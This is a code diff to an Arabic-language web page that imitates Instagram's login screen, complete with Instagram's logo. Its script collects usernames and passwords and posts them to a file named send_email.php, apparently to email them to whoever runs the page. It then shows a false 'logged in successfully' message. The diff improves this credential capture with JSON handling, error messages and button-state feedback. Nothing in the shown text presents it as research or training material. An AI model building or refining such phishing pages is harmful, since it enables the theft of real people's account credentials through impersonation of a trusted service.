@@ -202,7 +202,7 @@
                 <div class="logo">
                     <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="إنستجرام">
                 </div>
-                <form class="login-form" action="send_email.php" method="POST">
+                <form class="login-form" id="loginForm">
                     <input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف" required>
                     <input type="password" name="password" placeholder="كلمة السر" required>
                     <button type="submit">تسجيل الدخول</button>
@@ -220,24 +220,53 @@
                 <p>ليس لديك حساب؟ <a href="#">اشترك</a></p>
             </div>
             
-            <div class="success-message" id="successMessage" style="display:none;">
+            <div class="success-message" id="successMessage">
                 تم تسجيل الدخول بنجاح!
+            </div>
+            <div class="error-message" id="errorMessage">
+                حدث خطأ أثناء التسجيل، يرجى المحاولة لاحقاً
             </div>
         </div>
     </div>
 
     <script>
-        document.querySelector('.login-form').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            fetch(this.action, {
+            
+            // إظهار تحميل أو تعطيل الزر مؤقتاً
+            const submitBtn = this.querySelector('button[type="submit"]');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'جاري التسجيل...';
+            
+            // إخفاء الرسائل السابقة
+            document.getElementById('successMessage').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'none';
+            
+            // إرسال البيانات
+            fetch('send_email.php', {
                 method: 'POST',
-                body: new FormData(this)
+                body: new FormData(this),
+                headers: {
+                    'Accept': 'application/json'
+                }
             })
-            .then(response => {
-                if(response.ok) {
+            .then(response => response.json())
+            .then(data => {
+                if(data.success) {
                     document.getElementById('successMessage').style.display = 'block';
                     this.reset();
+                } else {
+                    document.getElementById('errorMessage').style.display = 'block';
+                    console.error('Error:', data.error);
                 }
+            })
+            .catch(error => {
+                document.getElementById('errorMessage').style.display = 'block';
+                console.error('Error:', error);
+            })
+            .finally(() => {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'تسجيل الدخول';
             });
         });
     </script>
